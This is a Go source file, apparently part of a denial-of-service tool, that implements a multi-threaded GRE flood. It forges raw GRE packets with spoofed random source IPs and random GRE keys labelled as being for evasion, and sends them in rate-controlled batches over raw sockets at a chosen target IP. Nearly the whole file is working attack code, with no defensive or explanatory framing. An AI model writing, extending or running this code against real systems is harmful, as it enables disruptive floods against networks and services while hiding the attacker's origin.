package main

import (
	"context"
	"encoding/binary"
	"fmt"
	"math/rand"
	"net"
	"runtime"
	"sync"
	"time"
)

const IPPROTO_GRE = 47

func buildGRE_Optimized(srcIP, dstIP net.IP, localRand *rand.Rand, buf []byte) []byte {
	// GRE Header (8 bytes with Key) + Inner IP (20) + Payload (100) = 128
	// Outer IP Header (20) + GRE Packet (128) = 148
	
	// GRE Header (at offset 20)
	gre := buf[20:28]
	gre[0] = 0x20 // Key present flag
	gre[1] = 0x00
	binary.BigEndian.PutUint16(gre[2:], 0x0800) // Protocol IPv4
	binary.BigEndian.PutUint32(gre[4:], localRand.Uint32()) // GRE Key for evasion
	
	// Inner IP Header (at offset 28)
	innerSrc := randomPublicIPLocal(localRand)
	innerHdr := buf[28:48]
	buildIPHeaderLocalOptimized(innerSrc, dstIP, 17, 120, localRand, innerHdr)
	
	// Inner Payload (at offset 48)
	payload := buf[48:148]
	localRand.Read(payload)
	
	// Outer IP Header (at offset 0)
	buildIPHeaderLocalOptimized(srcIP, dstIP, IPPROTO_GRE, 148, localRand, buf[0:20])
	
	return buf[:148]
}

func startGreFlood(ctx context.Context, opts ContextOpts, targetIP string, threads int, duration time.Duration, pps int) {
	fmt.Printf("[!] Starting GRE Flood on %s for %v with %d threads (PPS: %d)\n", targetIP, duration, threads, pps)

	var wg sync.WaitGroup
	

	dstIP := net.ParseIP(targetIP).To4()
	if dstIP == nil {
		fmt.Printf("[ERR] Invalid target IP: %s\n", targetIP)
		return
	}

	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func(threadID int) {
			defer func() { if r := recover(); r != nil { LogErr("SYS", "Panic in GRE flood: %v", r) } }()
			defer wg.Done()
			runtime.LockOSThread()
			defer runtime.UnlockOSThread()

			src := rand.NewSource(time.Now().UnixNano() + int64(threadID))
			localRand := rand.New(src)

			sockFd, err := openRawSocket(IPPROTO_GRE)
			if err != nil {
				return
			}
			defer closeSocket(sockFd)

			ipBuf := make([]byte, 256)

			for {
				// High-performance batching
				batchSize := 64
				if pps > 0 {
					if pps < 1000 {
						batchSize = 1
					} else if pps < 10000 {
						batchSize = 8
					}
					sleep := time.Second / time.Duration((pps/threads)/batchSize+1)
					time.Sleep(sleep)
				}

				select {
				case <-ctx.Done():
					return
				default:
					for b := 0; b < batchSize; b++ {
						srcIP := randomPublicIPLocal(localRand)
						packet := buildGRE_Optimized(srcIP, dstIP, localRand, ipBuf)

						if sockFd != InvalidSocket {
							sendtoRaw(sockFd, packet, dstIP, 0)
							AddStats(1, int64(len(packet)))
						}
					}
				}
			}
		}(i)
	}

	<-ctx.Done()
	wg.Wait()
	fmt.Printf("[OK] GRE Flood finished\n")
}
